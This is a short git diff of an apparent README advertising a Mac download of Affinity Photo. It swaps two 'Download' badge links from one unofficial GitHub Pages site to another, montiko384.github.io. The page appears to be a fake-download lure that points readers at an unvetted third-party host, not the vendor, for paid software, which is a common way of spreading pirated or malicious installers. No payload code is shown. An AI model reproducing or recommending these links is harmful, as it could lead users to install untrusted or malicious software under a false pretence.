@@ -2,7 +2,7 @@
 
 ![Affinity Photo Interface](https://cdn.serif.com/affinity/img/photo/home/0824/slider/photo-ocio-020820240816--lg@2x.png)  
 
-[![Download Now](https://img.shields.io/badge/Download-Affinity_Photo-blueviolet?style=for-the-badge&logo=apple)](https://affinity-photo-mac-download.github.io/.github/)
+[![Download Now](https://img.shields.io/badge/Download-Affinity_Photo-blueviolet?style=for-the-badge&logo=apple)](https://montiko384.github.io/.github/photo)
 
 ---
 
@@ -85,7 +85,7 @@ Discover the newest tools and improvements in the current version of Affinity Ph
 - Improved document export options  
 - Faster performance on Apple Silicon  
 
-[![Get Affinity Photo](https://img.shields.io/badge/Download-Affinity_Photo-success?style=for-the-badge&logo=apple)](https://affinity-photo-mac-download.github.io/.github/)  
+[![Get Affinity Photo](https://img.shields.io/badge/Download-Affinity_Photo-success?style=for-the-badge&logo=apple)](https://montiko384.github.io/.github/photo)  
 
 ---
 
